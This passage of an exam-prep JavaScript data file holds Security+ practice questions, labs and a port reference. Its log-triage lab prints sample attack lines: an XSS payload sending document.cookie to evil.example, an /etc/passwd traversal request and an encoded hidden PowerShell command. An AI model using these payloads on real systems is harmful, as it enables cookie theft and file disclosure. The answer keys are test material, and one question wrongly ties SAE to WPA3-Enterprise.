    question: "A company is upgrading its corporate Wi-Fi network. Previously, all employees shared a single passphrase (`WPA2-PSK`), which allowed an ex-employee to capture the 4-way EAPOL handshake and crack the password offline. The CISO mandates that each employee must authenticate using their individual Active Directory credentials or client certificate, and the wireless standard must also use Simultaneous Authentication of Equals (SAE) / GCMP-256 protection. What should be configured?",
    options: [
      "WPA3-Enterprise with 802.1X and a RADIUS server",
      "WPA2-Personal with WPS push-button authentication",
      "WPA3-Personal with a 24-character pre-shared key",
      "Open Wi-Fi with a Captive Portal and MAC filtering"
    ],
    correct: 0,
    explanation: "WPA3-Enterprise (802.1X/EAP) authenticates each user individually against a RADIUS (AAA) server rather than using a shared PSK, eliminating the risk of a single compromised password affecting the whole office and providing 192-bit/GCMP-256 cryptographic strength.",
    examTip: "Personal (PSK/SAE) = shared password for home/small office. Enterprise (802.1X) = individual logins/certs via RADIUS server."
  },
  {
    id: "q402",
    domain: "4.0",
    subdomain: "4.2 Vulnerability Management",
    difficulty: "Medium",
    threatName: "False Negative Vulnerability Scan",
    targetNode: "Endpoint Fleet",
    question: "A security analyst runs a monthly vulnerability scan against 200 Linux servers from an external scanner IP. The report shows zero missing OS library patches, yet a penetration tester easily exploits an outdated local `sudo` package on one of the servers the next day. How can the analyst improve the accuracy of the vulnerability scan to detect missing local packages with minimal false negatives?",
    options: [
      "Configure a credentialed (authenticated) scan using an SSH service account or deploy local agents",
      "Switch from an active vulnerability scan to a passive network sniffer",
      "Increase the TCP SYN scan rate in `nmap` to `-T5`",
      "Check the CVE identifier in the National Vulnerability Database (NVD)"
    ],
    correct: 0,
    explanation: "Non-credentialed scans only probe externally visible network ports and banners, often missing local registry settings, installed application versions, and OS patch levels (false negatives). A credentialed scan logs into the host (via SSH/WMI/WinRM) to inspect exact package versions.",
    examTip: "Credentialed scan = logs into the OS, finds local vulnerabilities, far fewer false negatives. Non-credentialed scan = external perspective only."
  },
  {
    id: "q403",
    domain: "4.0",
    subdomain: "4.2 Vulnerability Scoring & Standards",
    difficulty: "Medium",
    threatName: "Zero-Day Exploit Prioritization",
    targetNode: "Internal App",
    question: "Your vulnerability scanner reports 1,400 'High' severity vulnerabilities across your environment. Which protocol/framework suite is specifically used to automate security configuration checklists, and which metric within it assigns a numerical severity score from 0.0 to 10.0?",
    options: [
      "SCAP (Security Content Automation Protocol) and CVSS (Common Vulnerability Scoring System)",
      "STIX/TAXII and CVE (Common Vulnerabilities and Exposures)",
      "MITRE ATT&CK and CWE (Common Weakness Enumeration)",
      "SOC 2 Type II and ALE (Annualized Loss Expectancy)"
    ],
    correct: 0,
    explanation: "SCAP combines interoperable standards for automated vulnerability management, including CVE (dictionary of names), CCE (configuration issues), CPE (product naming), XCCDF/OVAL (checklists), and CVSS (0.0–10.0 numerical severity scoring).",
    examTip: "CVE = Vulnerability ID (`CVE-2026-1234`). CWE = Software flaw category (`CWE-89 SQL Injection`). CVSS = Severity score (`0.0–10.0`)."
  },
  {
    id: "q404",
    domain: "4.0",
    subdomain: "4.4 Security Monitoring & SOAR",
    difficulty: "Easy",
    threatName: "Automated Phishing Triage",
    targetNode: "Zero Trust PEP",
    question: "A SOC receives 5,000 phishing alerts per week. The SOC manager wants a platform that ingests alerts from the SIEM, automatically queries VirusTotal for file hashes, blocks malicious sender domains on the email gateway, and isolates infected endpoints via EDR APIs using pre-built automated playbooks. Which tool performs this automated playbook execution?",
    options: [
      "SOAR (Security Orchestration, Automation, and Response)",
      "SIEM (Security Information and Event Management)",
      "UEBA (User and Entity Behavior Analytics)",
      "FIM (File Integrity Monitoring)"
    ],
    correct: 0,
    explanation: "While a SIEM aggregates, correlates, and alerts on logs, a SOAR platform connects to external security tools via APIs and executes automated runbooks/playbooks to enrich indicators and take active containment responses (like isolating hosts or blocking IPs).",
    examTip: "SIEM = central log aggregation, correlation & alerting. SOAR = automated playbooks, orchestration & active response."
  },
  {
    id: "q405",
    domain: "4.0",
    subdomain: "4.6 Identity & Access Management",
    difficulty: "Medium",
    threatName: "Cross-Organization Federation",
    targetNode: "Auth / IdP",
    question: "A company adopts twelve new cloud SaaS applications for HR, CRM, and ticketing. The security architect wants employees to log in using their existing corporate Identity Provider (IdP) via XML-based assertions in the browser, while using a JSON/REST-based token standard for mobile apps to delegated API access. Which two protocols should be paired?",
    options: [
      "SAML 2.0 (XML assertions for web SSO) and OIDC / OAuth 2.0 (JSON tokens for mobile/API auth)",
      "RADIUS and TACACS+",
      "Kerberos Tickets and NTLMv2",
      "LDAP over SSL and SNMPv3"
    ],
    correct: 0,
    explanation: "SAML (Security Assertion Markup Language) uses XML assertions to provide federated Single Sign-On (SSO) between an IdP and web Service Providers (SPs). OAuth 2.0 (authorization) and OpenID Connect / OIDC (authentication layer on top of OAuth 2.0) use lightweight JSON Web Tokens (JWTs), ideal for modern mobile and API architectures.",
    examTip: "SAML = XML-based federated web SSO. OAuth 2.0 = API authorization. OIDC = JSON/JWT authentication built on OAuth 2.0. Kerberos = on-prem Active Directory tickets."
  },
  {
    id: "q406",
    domain: "4.0",
    subdomain: "4.6 Privileged Access Management",
    difficulty: "Medium",
    threatName: "Standing Domain Admin Compromise",
    targetNode: "Auth / IdP",
    question: "To reduce the blast radius of compromised administrator accounts, an organization removes all users from permanent membership in the 'Domain Admins' group. Instead, administrators must submit a ticket approval to receive elevated permissions for a maximum window of 2 hours, after which the permissions automatically revoke. What access control practice is this?",
    options: [
      "Just-in-Time (JIT) Privileged Access Management (PAM)",
      "Mandatory Access Control (MAC) with lattice labels",
      "Attribute-Based Access Control (ABAC) geofencing",
      "Discretionary Access Control (DAC)"
    ],
    correct: 0,
    explanation: "Just-in-Time (JIT) access eliminates permanent ('standing') privileges by granting elevated permissions dynamically only when needed and automatically revoking them when the timer expires.",
    examTip: "JIT (Just-in-Time) access + ephemeral credentials + vault password checkout/session recording are core components of Privileged Access Management (PAM)."
  },
  {
    id: "q407",
    domain: "4.0",
    subdomain: "4.8 Incident Response Process",
    difficulty: "Medium",
    threatName: "Active Ransomware Encryption",
    targetNode: "Endpoint Fleet",
    question: "An EDR alert fires at 10:15 AM showing an accounting workstation actively encrypting files on a local drive and attempting SMB connections to adjacent workstations. The SOC analyst verifies the alert is a true positive (Detection & Analysis complete). According to the NIST Incident Response lifecycle, what is the IMMEDIATE next phase?",
    options: [
      "Containment (e.g., isolating the workstation from the network via EDR or VLAN quarantine)",
      "Eradication (e.g., wiping the workstation and reimaging from gold master)",
      "Lessons Learned / Post-Incident Activity",
      "Preparation (e.g., updating the corporate acceptable use policy)"
    ],
    correct: 0,
    explanation: "The NIST SP 800-61 Incident Response lifecycle follows 4 phases (or PICERL): 1. Preparation -> 2. Detection & Analysis -> 3. Containment, Eradication, and Recovery -> 4. Post-Incident Activity. Once an active attack is identified, the immediate priority is Containment (isolating the host to stop lateral spread) before Eradication (removing the malware) or Forensic preservation is lost by wiping.",
    examTip: "Memorize the order: Preparation -> Identification/Detection -> Containment -> Eradication -> Recovery -> Lessons Learned. Never reimage/wipe (Eradication) before Containing and capturing volatile forensics!"
  },
  {
    id: "q408",
    domain: "4.0",
    subdomain: "4.8 Digital Forensics",
    difficulty: "Medium",
    threatName: "In-Memory Rootkit Investigation",
    targetNode: "Endpoint Fleet",
    question: "A forensic investigator responds to a compromised Linux web server that may be running an in-memory rootkit. Following the RFC 3227 Order of Volatility, in what sequence should the investigator collect evidence from MOST volatile to LEAST volatile?",
    options: [
      "CPU registers/cache -> System RAM & routing tables -> Swap space / Hard disk -> Remote logging/Archival backups",
      "Hard disk image -> System RAM -> CPU registers -> Printouts",
      "Archival tape backups -> Swap file -> Network ARP cache -> System RAM",
      "System RAM -> CPU cache -> BIOS firmware -> Active network connections"
    ],
    correct: 0,
    explanation: "The Order of Volatility dictates collecting the most ephemeral evidence first before it disappears: 1. CPU registers & cache, 2. Routing tables, ARP cache, process table, kernel statistics, and System RAM (memory), 3. Temporary file systems / swap space, 4. Persistent disk (SSD/HDD), 5. Remote logs and archival media.",
    examTip: "Order of Volatility: CPU Registers/Cache -> RAM/Network State -> Disk/Swap -> Backups/Remote Logs. Always pull the network cable NOT the power cord if you need RAM forensics!"
  },
  {
    id: "q409",
    domain: "4.0",
    subdomain: "4.8 Digital Forensics",
    difficulty: "Easy",
    threatName: "Admissibility Challenge in Court",
    targetNode: "Core DB",
    question: "During a criminal insider-threat prosecution, the defense attorney claims the laptop hard drive presented by the prosecution could have been modified after seizure. Which two items are ESSENTIAL to prove in court that the forensic evidence was handled properly and was never altered?",
    options: [
      "A documented Chain of Custody log and matching cryptographic hashes (e.g., SHA-256) captured with a hardware write-blocker",
      "An executive sign-off memo and a screenshot of the Windows desktop",
      "A Non-Disclosure Agreement (NDA) and an encrypted zip archive",
      "A vulnerability scan report and a SIEM correlation rule"
    ],
    correct: 0,
    explanation: "Chain of Custody documents every person who handled the evidence, when, and where it was stored. Taking a cryptographic hash (SHA-256) before and after imaging via a forensic write-blocker mathematically proves the bit-stream image is identical to the original evidence.",
    examTip: "Who touched the evidence = Chain of Custody. Proving the evidence wasn't altered = Cryptographic Hash (SHA-256) + Write Blocker."
  },
  {
    id: "q410",
    domain: "4.0",
    subdomain: "4.5 Email Security & DNS",
    difficulty: "Hard",
    threatName: "CEO Domain Spoofing Campaign",
    targetNode: "Web Gateway",
    question: "Customers report receiving fraudulent invoice emails that appear to come from `billing@yourcompany.com`. You have already published a DNS TXT record listing all authorized outbound mail server IP addresses (`SPF`) and configured cryptographic header signatures (`DKIM`). Which third DNS record tells receiving mail servers to REJECT messages that fail SPF/DKIM alignment and send aggregate XML reports back to your security team?",
    options: [
      "DMARC (`v=DMARC1; p=reject; rua=mailto:dmarc@yourcompany.com`)",
      "DNSSEC (`RRSIG` and `DNSKEY` records)",
      "MX record with priority 0",
      "CAA (Certification Authority Authorization) record"
    ],
    correct: 0,
    explanation: "SPF specifies which IPs are authorized to send mail for a domain. DKIM cryptographically signs the email headers/body to prove integrity. DMARC ties SPF and DKIM together by defining the enforcement policy (`p=none`, `p=quarantine`, or `p=reject`) and reporting addresses (`rua`/`ruf`) when alignment fails.",
    examTip: "SPF = Authorized IP list. DKIM = Cryptographic email signature. DMARC = Policy enforcement (`none`/`quarantine`/`reject`) + reporting."
  },

  // ============================================================================
  // DOMAIN 5.0: SECURITY PROGRAM MANAGEMENT AND OVERSIGHT (20%)
  // ============================================================================
  {
    id: "q501",
    domain: "5.0",
    subdomain: "5.2 Quantitative Risk Analysis",
    difficulty: "Medium",
    threatName: "Ransomware Financial Exposure",
    targetNode: "Core DB",
    question: "A quantitative risk assessment values a cloud database asset at $500,000. If a major cooling failure occurs, it is estimated to destroy 40% of the hardware's value (Exposure Factor = 0.40). Historical actuarial data indicates this type of failure occurs once every 5 years (Annualized Rate of Occurrence = 0.20). What are the Single Loss Expectancy (SLE) and Annualized Loss Expectancy (ALE)?",
    options: [
      "SLE = $200,000; ALE = $40,000",
      "SLE = $500,000; ALE = $100,000",
      "SLE = $100,000; ALE = $200,000",
      "SLE = $200,000; ALE = $1,000,000"
    ],
    correct: 0,
    explanation: "Formulas:\n1. Single Loss Expectancy (SLE) = Asset Value (AV) × Exposure Factor (EF) = $500,000 × 0.40 = $200,000.\n2. Annualized Loss Expectancy (ALE) = SLE × Annualized Rate of Occurrence (ARO) = $200,000 × 0.20 (once per 5 years = 1/5) = $40,000 per year.",
    examTip: "Memorize: SLE = AV × EF. ALE = SLE × ARO. If a safeguard costs less per year than the reduction in ALE, the control is cost-effective."
  },
  {
    id: "q502",
    domain: "5.0",
    subdomain: "5.2 Risk Management Strategies",
    difficulty: "Easy",
    threatName: "Catastrophic Breach Liability",
    targetNode: "Core DB",
    question: "After implementing technical controls, an organization determines that a nationwide zero-day cloud outage could still cost $10 million in regulatory fines and forensic fees. The board of directors purchases a comprehensive cybersecurity insurance policy to cover those financial damages. Which risk response strategy is the board using?",
    options: [
      "Risk Transference (Sharing)",
      "Risk Avoidance",
      "Risk Acceptance",
      "Risk Mitigation"
    ],
    correct: 0,
    explanation: "Purchasing cybersecurity insurance or outsourcing to a third party with liability clauses shifts the financial impact of a realized risk to another entity, which is Risk Transference.",
    examTip: "Insurance = Risk Transference. Stopping the risky business activity altogether = Risk Avoidance. Adding firewalls/MFA = Risk Mitigation. Documenting and living with residual risk = Risk Acceptance."
  },
  {
    id: "q503",
    domain: "5.0",
    subdomain: "5.2 Business Impact Analysis (BIA)",
    difficulty: "Medium",
    threatName: "Prolonged ERP Outage",
    targetNode: "Internal App",
    question: "During a Business Impact Analysis (BIA), the CFO states that if the order-processing database fails, the company can afford to lose at most 15 minutes of entered customer transactions before suffering severe financial harm. Which BIA metric is the CFO defining?",
    options: [
      "Recovery Point Objective (RPO)",
      "Recovery Time Objective (RTO)",
      "Mean Time Between Failures (MTBF)",
      "Mean Time To Repair (MTTR)"
    ],
    correct: 0,
    explanation: "Recovery Point Objective (RPO) measures the maximum acceptable amount of DATA loss measured in time (e.g., 15 minutes of transactions, dictating backup/replication frequency). Recovery Time Objective (RTO) measures the maximum acceptable DOWNTIME to restore the service.",
    examTip: "RPO = How much DATA loss in time can we tolerate? (Looks backward to last backup). RTO = How quickly must the SERVICE be back online? (Looks forward to recovery)."
  },
  {
    id: "q504",
    domain: "5.0",
    subdomain: "5.3 Third-Party Risk & Agreements",
    difficulty: "Medium",
    threatName: "Vendor API Integration Dispute",
    targetNode: "Web Gateway",
    question: "Two healthcare partners agree to connect their internal networks via an IPsec site-to-site VPN to exchange laboratory results. Which formal document specifies the exact technical parameters, encryption ciphers, IP subnets, ports, and security controls required for connecting the two systems?",
    options: [
      "Interconnection Security Agreement (ISA)",
      "Service Level Agreement (SLA)",
      "Memorandum of Understanding (MOU)",
      "Master Service Agreement (MSA)"
    ],
    correct: 0,
    explanation: "An Interconnection Security Agreement (ISA) defines the technical and security requirements for establishing, operating, and maintaining a direct network/system connection between two organizations.",
    examTip: "ISA = Technical security specs for connecting two networks. SLA = Uptime/performance metrics (99.99% availability). MOU/MOA = Non-binding intent to cooperate. NDA = Confidentiality."
  },
  {
    id: "q505",
    domain: "5.0",
    subdomain: "5.1 Data Governance Roles",
    difficulty: "Easy",
    threatName: "GDPR Right-to-Erasure Violation",
    targetNode: "Core DB",
    question: "A European Union customer submits a formal request under GDPR demanding that an online retailer delete their personal profile and purchase history. Meanwhile, the retailer utilizes a third-party cloud payroll processor to pay its staff. In GDPR terminology, what is the retailer's role regarding its customer data vs. the third-party payroll company's role?",
    options: [
      "The retailer is the Data Controller; the third-party payroll provider is the Data Processor",
      "The retailer is the Data Custodian; the third-party provider is the Data Owner",
      "Both entities are Data Subjects",
      "The retailer is the Data Processor; the customer is the Data Controller"
    ],
    correct: 0,
    explanation: "The Data Controller determines the 'why' and 'how' (purposes and means) of processing personal data. The Data Processor is a third party (such as a cloud vendor or payroll service) that processes data on behalf of the Controller.",
    examTip: "Controller = decides WHY and HOW data is collected. Processor = third party processing data on behalf of the controller. Custodian/Steward = IT staff maintaining day-to-day backups/ACLs."
  },
  {
    id: "q506",
    domain: "5.0",
    subdomain: "5.4 Penetration Testing & Rules of Engagement",
    difficulty: "Medium",
    threatName: "Unauthorized Pentest Scope Creep",
    targetNode: "Perimeter FW",
    question: "An external red team is hired to perform an assessment. The team is given zero prior network diagrams, source code, or credentials by the client, simulating an external unprivileged attacker with no insider knowledge. What type of environment knowledge model is this?",
    options: [
      "Unknown environment (formerly Black Box)",
      "Known environment (formerly White Box)",
      "Partially known environment (formerly Gray Box)",
      "Tabletop simulation"
    ],
    correct: 0,
    explanation: "SY0-701 uses updated terminology: Unknown environment (Black Box) = zero prior internal information given to testers; Known environment (White Box) = full source code, diagrams, and credentials provided; Partially known environment (Gray Box) = limited user-level knowledge provided.",
    examTip: "Note the SY0-701 terminology update: Unknown environment = Black Box; Known environment = White Box; Partially known = Gray Box."
  }
];

// ============================================================================
// INTERACTIVE PERFORMANCE-BASED QUESTIONS (PBQs)
// ============================================================================
window.SECPLUS_PBQS = [
  {
    id: "pbq_firewall",
    domain: "4.0",
    type: "firewall",
    title: "PBQ LAB 1: Perimeter Firewall ACL Remediation",
    threatName: "Multi-Vector DMZ Intrusion",
    briefing: "INCIDENT TICKET #9042: An audit of the edge firewall (`FW-EDGE-01`) revealed overly permissive rules allowing attackers to reach the internal Database Server (`10.20.50.10`) directly from the Internet (`0.0.0.0/0`).\n\nConfigure the stateful firewall rules below (evaluated top-to-bottom, implicit DENY ALL at bottom) to enforce least privilege:\n1. Allow external users (`ANY`) to reach the DMZ Web Server (`172.16.10.25`) ONLY over HTTPS.\n2. Allow the DMZ Web Server (`172.16.10.25`) to query the Internal DB (`10.20.50.10`) over MySQL/TLS (Port 3306).\n3. Explicitly BLOCK any direct traffic from `ANY` external host to the Internal DB (`10.20.50.10`).\n4. Allow the Admin Jumpbox (`10.10.1.5`) to manage the DMZ Web Server (`172.16.10.25`) via SSH.",
    rules: [
      {
        ruleNum: 10,
        description: "External clients -> DMZ Web Server (HTTPS only)",
        source: "ANY (0.0.0.0/0)",
        dest: "172.16.10.25 (DMZ Web)",
        portOptions: ["80 (HTTP)", "443 (HTTPS)", "22 (SSH)", "3389 (RDP)"],
        actionOptions: ["ALLOW", "DENY"],
        correctPort: "443 (HTTPS)",
        correctAction: "ALLOW"
      },
      {
        ruleNum: 20,
        description: "DMZ Web Server -> Internal Database (MySQL)",
        source: "172.16.10.25 (DMZ Web)",
        dest: "10.20.50.10 (Internal DB)",
        portOptions: ["443 (HTTPS)", "3306 (MySQL)", "445 (SMB)", "53 (DNS)"],
        actionOptions: ["ALLOW", "DENY"],
        correctPort: "3306 (MySQL)",
        correctAction: "ALLOW"
      },
      {
        ruleNum: 30,
        description: "Admin Jumpbox -> DMZ Web Server (Secure Remote CLI)",
        source: "10.10.1.5 (Jumpbox)",
        dest: "172.16.10.25 (DMZ Web)",
        portOptions: ["23 (Telnet)", "22 (SSH)", "21 (FTP)", "3389 (RDP)"],
        actionOptions: ["ALLOW", "DENY"],
        correctPort: "22 (SSH)",
        correctAction: "ALLOW"
      },
      {
        ruleNum: 40,
        description: "Block direct external access to Internal Database",
        source: "ANY (0.0.0.0/0)",
        dest: "10.20.50.10 (Internal DB)",
        portOptions: ["ANY (All Ports)", "80 (HTTP)", "25 (SMTP)", "110 (POP3)"],
        actionOptions: ["ALLOW", "DENY"],
        correctPort: "ANY (All Ports)",
        correctAction: "DENY"
      }
    ],
    explanation: "Firewalls process Access Control Lists (ACLs) sequentially from top to bottom. Only HTTPS (TCP 443) should be exposed to the public internet for the DMZ web tier; the web tier communicates with the internal database tier over TCP 3306 (MySQL); management must use encrypted SSH (TCP 22) rather than cleartext Telnet (TCP 23); and direct external access to the database subnet is strictly denied."
  },
  {
    id: "pbq_log_triage",
    domain: "2.0",
    type: "log_triage",
    title: "PBQ LAB 2: SIEM Log Forensics & Attack Identification",
    threatName: "Multi-Stage Web & Auth Attack",
    briefing: "INCIDENT TICKET #9108: The SIEM flagged three suspicious log entries across your Web Application Firewall, Linux Auth log, and PowerShell operational log. Inspect each log artifact and classify the exact attack vector and the optimal remediation.",
    logs: [
      {
        id: "log1",
        source: "nginx-access.log",
        snippet: `198.51.100.42 - - [25/Oct/2026:14:11:09] "GET /profile?msg=%3Cscript%3Efetch('https://evil.example/steal?c='+document.cookie)%3C/script%3E HTTP/1.1" 200`,
        attackOptions: ["Cross-Site Scripting (XSS)", "SQL Injection (SQLi)", "Directory Traversal", "XML External Entity (XXE)"],
        remediationOptions: [
          "Context-aware output encoding, input sanitization & Content-Security-Policy (CSP) + HttpOnly cookies",
          "Disable DHCP Snooping on the core switch",
          "Upgrade from RAID 5 to RAID 10",
          "Increase password minimum length to 14 characters"
        ],
        correctAttack: "Cross-Site Scripting (XSS)",
        correctRemediation: "Context-aware output encoding, input sanitization & Content-Security-Policy (CSP) + HttpOnly cookies"
      },
      {
        id: "log2",
        source: "apache-error.log",
        snippet: `203.0.113.88 - - [25/Oct/2026:14:14:52] "GET /download.php?file=../../../../etc/passwd HTTP/1.1" 200 2841`,
        attackOptions: ["Directory / Path Traversal", "Cross-Site Request Forgery (CSRF)", "ARP Poisoning", "Buffer Overflow"],
        remediationOptions: [
          "Canonicalize file paths, restrict to chroot/allowlisted base directory & strip '../' sequences",
          "Enable OCSP Stapling on the domain controller",
          "Deploy WPAD auto-configuration scripts",
          "Switch wireless authentication to WPA3-SAE"
        ],
        correctAttack: "Directory / Path Traversal",
        correctRemediation: "Canonicalize file paths, restrict to chroot/allowlisted base directory & strip '../' sequences"
      },
      {
        id: "log3",
        source: "Windows-PowerShell/Operational (Event ID 4104)",
        snippet: `powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA=`,
        attackOptions: ["Living-off-the-Land (LotL) / Obfuscated Fileless Execution", "VLAN Hopping", "SQL Injection", "Bluejacking"],
        remediationOptions: [
          "Enforce PowerShell Constrained Language Mode, Signed Script Execution Policy & AMSI/EDR behavioral blocking",
          "Configure an HTML Content-Security-Policy header",
          "Disable SSID broadcasting on guest Wi-Fi",
          "Purchase cyber liability insurance"
        ],
        correctAttack: "Living-off-the-Land (LotL) / Obfuscated Fileless Execution",
        correctRemediation: "Enforce PowerShell Constrained Language Mode, Signed Script Execution Policy & AMSI/EDR behavioral blocking"
      }
    ],
    explanation: "Log 1 shows URL-encoded `<script>` tags stealing `document.cookie` (Reflected XSS). Log 2 uses `../../../../etc/passwd` dot-dot-slash sequences to escape the web root (Directory Traversal). Log 3 uses hidden, Base64-encoded PowerShell (`-EncodedCommand`) to run fileless payloads in memory (Living-off-the-Land)."
  },
  {
    id: "pbq_ir_zones",
    domain: "3.0",
    type: "architecture_match",
    title: "PBQ LAB 3: Zero Trust & Secure Zone Placement",
    threatName: "Architectural Audit Remediation",
    briefing: "INCIDENT TICKET #9215: The Enterprise Architecture board is redesigning the network and cryptographic infrastructure. Match each security requirement to the exact protocol, port, or architectural component required by CompTIA Security+ (SY0-701) standards.",
    items: [
      {
        prompt: "Centralized AAA protocol that encrypts the ENTIRE packet payload (not just the password) and separates Authentication, Authorization, and Accounting for network device administration (TCP 49):",
        options: ["TACACS+", "RADIUS", "Kerberos", "SNMPv2c"],
        correct: "TACACS+"
      },
      {
        prompt: "Secure protocol & default port used to query and modify Active Directory / directory services over TLS:",
        options: ["LDAPS (TCP 636)", "LDAP (TCP 389)", "RDP (TCP 3389)", "SMB (TCP 445)"],
        correct: "LDAPS (TCP 636)"
      },
      {
        prompt: "Network zone placed between an external untrusted network and an internal trusted LAN to host public-facing web, mail, and DNS servers:",
        options: ["Screened Subnet (DMZ)", "Air-Gapped SCADA Enclave", "VLAN 1 Default Native", "Out-of-Band Management LAN"],
        correct: "Screened Subnet (DMZ)"
      },
      {
        prompt: "Automated threat intelligence sharing protocol format (JSON-based structured threat info) paired with its HTTPS transport mechanism:",
        options: ["STIX / TAXII", "SCAP / CVSS", "SPF / DKIM", "SAML / OIDC"],
        correct: "STIX / TAXII"
      }
    ],
    explanation: "TACACS+ (TCP 49) encrypts the entire AAA body and separates auth/authz, whereas RADIUS (UDP 1812/1813) only encrypts the password attribute and combines authentication/authorization. LDAPS uses TCP 636 (cleartext LDAP is 389). A Screened Subnet (DMZ) isolates public-facing servers. STIX (Structured Threat Information Expression) and TAXII (Trusted Automated Exchange of Intelligence Information) standardize automated cyber threat intelligence sharing."
  }
];

// ============================================================================
// ACRONYM & PORT SPEED REFERENCE MATRIX
// ============================================================================
window.SECPLUS_REFERENCE = [
  { term: "AAA", category: "Concept", domain: "1.0", desc: "Authentication, Authorization, and Accounting — foundational access control framework." },
  { term: "ACL", category: "Network", domain: "4.0", desc: "Access Control List — ordered rules permitting or denying traffic or file access." },
  { term: "AES", category: "Crypto", domain: "1.0", desc: "Advanced Encryption Standard — symmetric block cipher (128, 192, or 256-bit keys)." },
  { term: "ALE / SLE / ARO", category: "Risk", domain: "5.0", desc: "Quantitative risk formulas: SLE = AV × EF; ALE = SLE × ARO." },
  { term: "APT", category: "Threat", domain: "2.0", desc: "Advanced Persistent Threat — well-funded, stealthy, often nation-state adversary." },
  { term: "BIA", category: "Risk", domain: "5.0", desc: "Business Impact Analysis — identifies critical systems, RTO, RPO, MTBF, and MTTR." },
  { term: "CASB", category: "Cloud", domain: "3.0", desc: "Cloud Access Security Broker — enforces DLP and security policies between users and SaaS." },
  { term: "CSRF / XSRF", category: "AppSec", domain: "2.0", desc: "Cross-Site Request Forgery — tricks an authenticated user's browser into sending unauthorized requests." },
  { term: "CVE / CVSS", category: "Vuln", domain: "4.0", desc: "Common Vulnerabilities and Exposures (ID) & Common Vulnerability Scoring System (0–10 severity)." },
  { term: "DAI", category: "Network", domain: "2.0", desc: "Dynamic ARP Inspection — switch feature preventing ARP poisoning using the DHCP snooping table." },
  { term: "DKIM / SPF / DMARC", category: "Ops", domain: "4.0", desc: "Email authentication trio: SPF (allowed IPs), DKIM (crypto signature), DMARC (policy & reporting)." },
  { term: "DLP", category: "Data", domain: "4.0", desc: "Data Loss Prevention — detects and blocks exfiltration of sensitive data (PII, PCI, IP) at endpoint/network/cloud." },
  { term: "EDR / XDR", category: "Ops", domain: "4.0", desc: "Endpoint Detection & Response / Extended Detection & Response — behavioral threat detection & host isolation." },
  { term: "FIDO2 / WebAuthn", category: "IAM", domain: "4.0", desc: "Phishing-resistant passwordless/MFA standard using hardware security keys or passkeys." },
  { term: "HSM / TPM", category: "Crypto", domain: "1.0", desc: "Hardware Security Module (enterprise appliance) vs. Trusted Platform Module (endpoint motherboard chip)." },
  { term: "OCSP Stapling", category: "PKI", domain: "1.0", desc: "Online Certificate Status Protocol Stapling — web server caches signed CA revocation status in TLS handshake." },
  { term: "PAM / JIT", category: "IAM", domain: "4.0", desc: "Privileged Access Management & Just-in-Time access — ephemeral elevation and vaulting for admin accounts." },
  { term: "PQC", category: "Crypto", domain: "1.0", desc: "Post-Quantum Cryptography — lattice-based algorithms (e.g., ML-KEM) resistant to quantum computers." },
  { term: "RPO / RTO", category: "Resilience", domain: "3.0", desc: "Recovery Point Objective (max data loss in time) vs. Recovery Time Objective (max acceptable downtime)." },
  { term: "SAML / OIDC / OAuth", category: "IAM", domain: "4.0", desc: "Federation standards: SAML (XML SSO), OAuth 2.0 (API authorization), OIDC (JSON/JWT identity layer)." },
  { term: "SASE", category: "Cloud", domain: "3.0", desc: "Secure Access Service Edge — converges SD-WAN with cloud security (ZTNA, CASB, SWG, FWaaS)." },
  { term: "SBOM", category: "Supply Chain", domain: "2.0", desc: "Software Bill of Materials — complete inventory of software components and transitive dependencies." },
  { term: "SCAP", category: "Vuln", domain: "4.0", desc: "Security Content Automation Protocol — NIST suite (CVE, CVSS, OVAL, XCCDF) for automated compliance/vuln checking." },
  { term: "SIEM / SOAR", category: "Ops", domain: "4.0", desc: "SIEM aggregates/correlates logs; SOAR executes automated response playbooks and orchestrates tools." },
  { term: "STIX / TAXII", category: "Threat Intel", domain: "4.0", desc: "Structured Threat Information Expression (format) & Trusted Automated Exchange of Indicator Info (transport)." },
  { term: "TOCTOU", category: "Vuln", domain: "2.0", desc: "Time-of-Check to Time-of-Use — race condition exploiting the window between permission check and resource access." },
  { term: "ZTA (PDP / PEP)", category: "Arch", domain: "1.0", desc: "Zero Trust Architecture — Policy Decision Point (Control Plane) & Policy Enforcement Point (Data Plane)." },
  { term: "Port 22 / 23", category: "Port", domain: "4.0", desc: "TCP 22 = SSH / SFTP / SCP (encrypted CLI/file transfer). TCP 23 = Telnet (unencrypted legacy CLI)." },
  { term: "Port 53", category: "Port", domain: "4.0", desc: "UDP/TCP 53 = DNS (name resolution). DNS over TLS (DoT) uses TCP 853; DNS over HTTPS (DoH) uses TCP 443." },
  { term: "Port 389 / 636", category: "Port", domain: "4.0", desc: "TCP 389 = LDAP (directory services). TCP 636 = LDAPS (LDAP over TLS)." },
  { term: "Port 443 / 80", category: "Port", domain: "4.0", desc: "TCP 443 = HTTPS (TLS encrypted web). TCP 80 = HTTP (cleartext web)." },
  { term: "Port 445 / 3389", category: "Port", domain: "4.0", desc: "TCP 445 = SMB (Windows file sharing). TCP 3389 = RDP (Remote Desktop Protocol)." },
  { term: "Port 1812 / 49", category: "Port", domain: "4.0", desc: "UDP 1812/1813 = RADIUS (AAA). TCP 49 = TACACS+ (AAA device administration)." }
];
